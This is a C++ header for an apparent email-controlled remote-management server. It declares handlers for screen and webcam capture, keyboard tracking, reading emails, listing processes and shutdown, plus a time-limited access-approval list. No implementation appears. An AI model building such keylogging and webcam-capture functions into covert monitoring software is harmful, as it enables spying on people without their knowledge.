#pragma once
#include "..\Libs\Header.h"
#include "..\GmailAPI\GmailAPI.h"
#include "..\Server\EmailMonitor.h"
#include "..\Server\Config.h"

struct AccessInfo {
    string email;
    time_t grantedTime;
    static const int VALIDITY_HOURS = 24;
};

class ServerManager {
private:
    GmailAPI& gmail;  // Ensure this declaration
    EmailMonitor monitor;
    bool running;
    ServerConfig config;
    vector<AccessInfo> approvedAccess;  // Store access info with timestamps
    bool isAccessValid(const AccessInfo& access) const;
    void cleanupExpiredAccess();
    void saveAccessList() const;
    void loadAccessList();
	bool isEmailApproved(const string& email);
	void handleAccessRequest(const Json::Value& command);

    void logActivity(const string& activity);

public:
    ServerManager(GmailAPI& api);
    void start();
    void stop();
    bool isRunning() const;
    void processCommands();
    void handleCommand(const Json::Value& command); // Move to public
    void handleProcessListCommand(const Json::Value& command);
	void handleReadRecentEmailsCommand(const Json::Value& command);
	void handleCaptureScreen(const Json::Value& command);
    void handleCaptureWebcam(const Json::Value& command);
	void handleTrackKeyboard(const Json::Value& command);
    void handleScreenshotCommand(const Json::Value& command);
	void handleSystemInfoCommand(const Json::Value& command);
    void handleShutdownCommand(const Json::Value& command);
};